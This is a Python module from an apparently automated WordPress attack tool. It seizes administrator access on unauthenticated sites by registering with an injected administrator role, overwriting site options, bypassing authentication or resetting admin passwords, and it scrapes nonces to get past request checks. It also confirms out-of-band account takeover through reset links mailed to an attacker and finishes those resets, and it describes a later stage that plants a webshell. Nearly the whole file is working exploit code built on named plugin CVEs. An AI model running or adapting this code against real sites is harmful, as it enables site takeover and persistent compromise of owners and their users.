"""Track B, stage 1 — abuse an unauthenticated flaw to obtain administrator
access, WITHOUT a victim. Four recipe kinds, all fully automatable:

  register-role   : a nopriv registration that honours an attacker role param
                    (e.g. CVE-2026-0920, LA-Studio's lakit_bkrole) → new admin.
  options-update  : arbitrary option write → default_role=administrator +
                    open registration → register lands as admin.
  auth-bypass     : a request that leaves the session authenticated as admin.
  password-reset  : reset a known admin's password to one we choose.

None of these is code execution by itself — each yields an admin *session or
credentials*. Stage 2 (wp_authshell) then plants a webshell. Success is
confirmed downstream by actually logging in / planting, never by trusting the
exploit's HTTP response. Recipe field values are CVE-specific — confirm them
against the PoC (see wp_recipes for the shapes).

One further kind is CONFIRM-ONLY (not fully automatable):

  account-takeover-oob : an unauth password-reset endpoint that mails the reset
                    link to an ATTACKER-supplied address (e.g. Kirki
                    CVE-2026-8206). The tool can't read that mailbox, so it
                    can't finish the takeover — it only PROVES the primitive
                    fires (endpoint accepts an arbitrary email for a valid
                    user → 200 + success marker) and returns {'confirmed_oob'}.
"""
import re
import secrets

from . import exploit as _exploit  # reuse the JS-localized nonce scraper


def _random_creds():
    user = "svc_" + secrets.token_hex(4)
    return {"username": user, "email": f"{user}@mail.invalid",
            "password": secrets.token_hex(12)}


def acquire_admin(base_url, http, recipe, creds=None):
    """Dispatch on recipe['kind']. Returns one of:
      {'username','password'} — caller must log in with these, or
      {'authed': True}        — the session is already an admin, or
      None                    — transport error / unsupported kind."""
    kind = recipe.get("kind", "register-role")
    base = base_url.rstrip("/")
    try:
        if kind in ("register-role", "register-admin"):
            return _register_role(base, http, recipe, creds)
        if kind == "options-update":
            return _options_update(base, http, recipe, creds)
        if kind == "auth-bypass":
            return _auth_bypass(base, http, recipe)
        if kind in ("password-reset", "account-takeover"):
            return _password_reset(base, http, recipe)
        if kind in ("account-takeover-oob", "oob-account-takeover"):
            return _account_takeover_oob(base, http, recipe)
    except Exception:
        return None
    return None


def _register_role(base, http, recipe, creds):
    creds = creds or _random_creds()
    data = dict(recipe.get("extra_params", {}))    # static fields the form requires
    data["action"] = recipe["action"]
    data[recipe.get("user_field", "user_login")] = creds["username"]
    data[recipe.get("email_field", "email")] = creds["email"]
    data[recipe.get("pass_field", "password")] = creds["password"]
    if recipe.get("pass_confirm_field"):
        data[recipe["pass_confirm_field"]] = creds["password"]
    data[recipe["role_param"]] = recipe.get("role_value", "administrator")
    # Many real registration handlers require a nonce lifted from the form page.
    # Some print it as a hidden <input> (nonce_from.field); others localize it
    # into a page's JS instead (nonce_from.key, e.g. King Addons CVE-2025-6325's
    # register_nonce inside king_addons_login_register_vars) -- and a plugin
    # localizing several same-keyed nonces in different objects needs
    # nonce_from.object to disambiguate which one (see _harvest_js_nonce).
    nf = recipe.get("nonce_from")
    if nf:
        if nf.get("field"):
            nonce = _harvest_input_nonce(base, http, base + nf["url"], nf["field"])
            param = nf.get("param", nf["field"])
        else:
            nonce = _exploit._harvest_js_nonce(http, base + nf["url"], nf["key"],
                                               object_name=nf.get("object"))
            param = nf.get("param", nf["key"])
        if nonce:
            data[param] = nonce
    http.post(base + recipe["endpoint"], data=data)
    return {"username": creds["username"], "password": creds["password"]}


def _harvest_input_nonce(base, http, url, field):
    """Pull a hidden-input nonce value (name/value in either order) off a form
    page. Returns '' if absent — the POST then goes without it (some handlers
    don't enforce it), and VERIFY/login is what proves whether it took."""
    _, page = _fetch_text(http, url)
    for pat in (r'name=["\']' + re.escape(field) + r'["\'][^>]*?value=["\']([^"\']+)',
                r'value=["\']([^"\']+)["\'][^>]*?name=["\']' + re.escape(field) + r'["\']'):
        m = re.search(pat, page)
        if m:
            return m.group(1)
    return ""


def _options_update(base, http, recipe, creds):
    # 1. force open registration + admin default role via the option-write bug
    for opt, val in (recipe.get("set_options") or {}).items():
        payload = dict(recipe.get("params", {}))
        payload[recipe.get("option_name_param", "option")] = opt
        payload[recipe.get("option_value_param", "value")] = val
        http.post(base + recipe["endpoint"], data=payload)
    # 2. register — now lands as the default role we just set (administrator)
    creds = creds or _random_creds()
    reg = recipe.get("register_endpoint", "/wp-login.php?action=register")
    data = {recipe.get("user_field", "user_login"): creds["username"],
            recipe.get("email_field", "user_email"): creds["email"]}
    if recipe.get("pass_field"):
        data[recipe["pass_field"]] = creds["password"]
    http.post(base + reg, data=data)
    return {"username": creds["username"], "password": creds["password"]}


def _auth_bypass(base, http, recipe):
    url = base + recipe["endpoint"]
    if recipe.get("method", "GET").upper() == "POST":
        http.post(url, data=recipe.get("params", {}))
    else:
        http.get(url, params=recipe.get("params", {}))
    # the request is expected to leave the session authenticated as admin
    return {"authed": True}


def _password_reset(base, http, recipe):
    target = recipe.get("target_user", "admin")
    newpw = _random_creds()["password"]
    data = dict(recipe.get("params", {}))
    data[recipe.get("user_param", "user_login")] = target
    data[recipe.get("pass_param", "new_password")] = newpw
    # Some reset forms require the new password twice (EA: eael-pass1/eael-pass2).
    if recipe.get("pass_confirm_param"):
        data[recipe["pass_confirm_param"]] = newpw
    # …and are nonce-gated by a value printed in a page's JS rather than a hidden
    # input (EA CVE-2023-32243: `var localize = {..."nonce":"..."}` on the home
    # page, action 'essential-addons-elementor'). Harvest it when the recipe asks;
    # if absent the POST still goes (a wrong/missing nonce just fails server-side,
    # never a false positive — login/authshell downstream is the real proof).
    nf = recipe.get("nonce_from")
    if nf:
        nonce = _exploit._harvest_js_nonce(http, base + nf.get("url", "/"), nf["key"])
        if nonce:
            data[nf.get("param", nf["key"])] = nonce
    http.post(base + recipe["endpoint"], data=data)
    return {"username": target, "password": newpw}


# WP exposes a REST nonce in-page (wpApiSettings) for logged-out visitors; a
# missing-permission endpoint usually ignores it, but send it when present so
# the recipe also fires on installs that still gate on X-WP-Nonce.
# The key itself may or may not be quoted -- wp_localize_script always emits
# valid JSON ("nonce":"..."), but plugins with hand-rolled inline JS (e.g.
# Kirki's window.wp_kirki = {...}) commonly use a bare object key (nonce:"...")
# instead. \b guards against matching inside a longer identifier (xnonce:).
_REST_NONCE = re.compile(r"""\bnonce["']?\s*:\s*["']([A-Za-z0-9]{6,})["']""")


def _harvest_rest_nonce(base, http, recipe):
    """Best-effort REST nonce. A static recipe['nonce'] wins; otherwise scrape
    one from a page (default home). Returns '' when none is found — the caller
    simply omits the header, which is correct for a truly public endpoint."""
    if recipe.get("nonce"):
        return recipe["nonce"]
    _, page = _fetch_text(http, base + recipe.get("nonce_url", "/"))
    m = _REST_NONCE.search(page)
    return m.group(1) if m else ""


def _fetch_text(http, url):
    try:
        r = http.get(url)
        return getattr(r, "status_code", 0), (getattr(r, "text", "") or "")
    except Exception:
        return 0, ""


def _account_takeover_oob(base, http, recipe):
    """CONFIRM-ONLY: fire an unauth password-reset that mails the link to an
    attacker address, and prove the endpoint accepted it. Cannot complete the
    takeover (we can't read the mailbox), so never returns creds — just a
    {'confirmed_oob': True} proof, or None if the endpoint rejected the request."""
    target = recipe.get("target_user", "admin")
    attacker = recipe.get("attacker_email", "pentest@mail.invalid")
    data = dict(recipe.get("extra_params", {}))
    data[recipe.get("user_param", "username")] = target
    data[recipe.get("email_param", "email")] = attacker
    headers = {}
    nonce = _harvest_rest_nonce(base, http, recipe)
    if nonce and recipe.get("nonce_header"):
        headers[recipe["nonce_header"]] = nonce
    r = http.post(base + recipe["endpoint"], data=data, headers=headers or None)
    body = getattr(r, "text", "") or ""
    marker = recipe.get("success_marker", "")
    if getattr(r, "status_code", 0) == 200 and marker and marker in body:
        return {"confirmed_oob": True,
                "detail": f"{recipe['endpoint']} accepted an arbitrary email "
                          f"({attacker}) for user '{target}' → reset link sent "
                          f"to attacker. Complete the takeover from that mailbox."}
    return None


def complete_reset_key(base, http, reset_key, login="admin", new_password=None):
    """Finish a WordPress password reset from a key captured out-of-band — e.g. the
    reset link an OOB-takeover CVE (kirki CVE-2026-8206) mails to the attacker's
    inbox. This is the one manual step account-takeover-oob can't automate: the
    operator reads the key, then this closes it out. Mirrors wp-login.php's two-step
    flow on the shared session — action=rp primes the wp-resetpass-<COOKIEHASH>
    cookie (login:key), then action=resetpass POSTs the new password WITH rp_key,
    which WP hash_equals's against the cookie's key (omitting rp_key is a PHP-8
    TypeError → 500, not a silent no-op). Returns {'username','password'} when the
    page confirms the reset, else None; the caller then logs in to prove it took."""
    base = base.rstrip("/")
    newpw = new_password or _random_creds()["password"]
    login_url = base + "/wp-login.php"
    try:
        http.get(login_url, params={"action": "rp", "key": reset_key, "login": login})
        r = http.post(login_url, params={"action": "resetpass"},
                      data={"rp_key": reset_key, "pass1": newpw, "pass2": newpw,
                            "wp-submit": "Reset Password"})
    except Exception:
        return None
    if "has been reset" in (getattr(r, "text", "") or ""):
        return {"username": login, "password": newpw}
    return None
